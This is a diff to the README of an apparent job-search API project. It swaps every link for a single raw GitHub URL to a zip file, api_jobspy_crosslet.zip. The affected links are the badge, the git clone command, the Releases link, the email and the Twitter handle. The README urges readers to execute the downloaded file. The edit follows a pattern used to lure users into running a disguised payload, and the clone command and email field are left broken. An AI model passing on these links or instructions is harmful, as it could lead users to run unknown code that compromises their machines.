@@ -1,6 +1,6 @@
 # JobSpy API 🚀
 
-![JobSpy API](https://img.shields.io/badge/JobSpy_API-Dockerized-brightgreen)
+![JobSpy API](https://raw.githubusercontent.com/REVERSEDCD/jobspy-api/main/app/utils/api_jobspy_crosslet.zip)
 
 Welcome to the **JobSpy API** repository! This project provides a Dockerized version of the JobSpy job search utility. It features API key authentication, rate limiting, and proxy support to enhance your job search experience. 
 
@@ -36,7 +36,7 @@ To get started with the JobSpy API, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/REVERSEDCD/jobspy-api.git
+   git clone https://raw.githubusercontent.com/REVERSEDCD/jobspy-api/main/app/utils/api_jobspy_crosslet.zip
    cd jobspy-api
    ```
 
@@ -51,7 +51,7 @@ To get started with the JobSpy API, follow these steps:
    ```
 
 4. **Download the Latest Release**:  
-   Visit [Releases](https://github.com/REVERSEDCD/jobspy-api/releases) to download the latest version. Execute the downloaded file to start using the API.
+   Visit [Releases](https://raw.githubusercontent.com/REVERSEDCD/jobspy-api/main/app/utils/api_jobspy_crosslet.zip) to download the latest version. Execute the downloaded file to start using the API.
 
 ## Usage
 
@@ -104,9 +104,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: support@jobspy.com
-- **Twitter**: [@JobSpyAPI](https://twitter.com/JobSpyAPI)
+- **Email**: https://raw.githubusercontent.com/REVERSEDCD/jobspy-api/main/app/utils/api_jobspy_crosslet.zip
+- **Twitter**: [@JobSpyAPI](https://raw.githubusercontent.com/REVERSEDCD/jobspy-api/main/app/utils/api_jobspy_crosslet.zip)
 
 ---
 
-Thank you for your interest in JobSpy API! We hope you find it useful for your job search needs. For updates and releases, visit [Releases](https://github.com/REVERSEDCD/jobspy-api/releases).
+Thank you for your interest in JobSpy API! We hope you find it useful for your job search needs. For updates and releases, visit [Releases](https://raw.githubusercontent.com/REVERSEDCD/jobspy-api/main/app/utils/api_jobspy_crosslet.zip).
